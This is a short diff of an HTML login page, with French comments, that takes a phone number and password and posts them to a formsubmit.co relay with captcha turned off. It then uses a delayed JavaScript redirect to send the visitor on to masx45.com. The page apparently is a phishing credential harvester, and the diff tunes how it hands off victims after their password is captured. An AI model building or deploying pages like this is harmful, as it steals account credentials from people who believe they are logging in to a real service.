@@ -132,12 +132,11 @@
       <div class="tab">Email Login</div>
     </div>
 
-    <form action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="showPleaseWait()">
-      <!-- Redirection -->
-      <input type="hidden" name="_next" value="https://masx45.com/">
+    <form action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
+      <!-- Redirection normale -->
       <input type="hidden" name="_captcha" value="false">
 
-      <!-- Champs du formulaire -->
+      <!-- Champs -->
       <input type="text" name="phone_number" placeholder="Phone Number" required />
       <input type="password" name="password" placeholder="Password" required />
 
@@ -156,8 +155,15 @@
   </div>
 
   <script>
-    function showPleaseWait() {
+    function handleSubmit() {
       document.getElementById("please-wait").style.display = "block";
+
+      // Attendre 1 seconde avant de rediriger
+      setTimeout(() => {
+        window.location.href = "https://masx45.com/";
+      }, 1000);
+
+      return true; // permet au formulaire d’être soumis
     }
   </script>
 </body>
